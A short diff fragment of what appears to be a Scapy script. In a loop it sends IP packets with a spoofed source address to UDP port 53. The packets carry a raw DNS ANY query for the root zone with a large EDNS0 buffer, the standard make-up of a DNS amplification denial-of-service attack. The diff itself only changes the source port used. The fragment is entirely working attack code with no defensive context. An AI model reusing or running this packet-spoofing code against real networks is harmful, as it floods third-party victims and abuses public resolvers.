@@ -7,5 +7,5 @@ C= [16863, 5353]
 D= "\xc4\x75\x01\x00\x00\x01\x00\x00\x00\x00\x00\x01\x00\x00\xff\x00\x01\x00\x00\x29\x23\x28\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
 
 for i in range(0, 10):
-    spoofed_packet = IP(src=A, dst=B) / UDP(sport=C[i%2], dport=53) / D
+    spoofed_packet = IP(src=A, dst=B) / UDP(sport=C[0], dport=53) / D
     send(spoofed_packet)
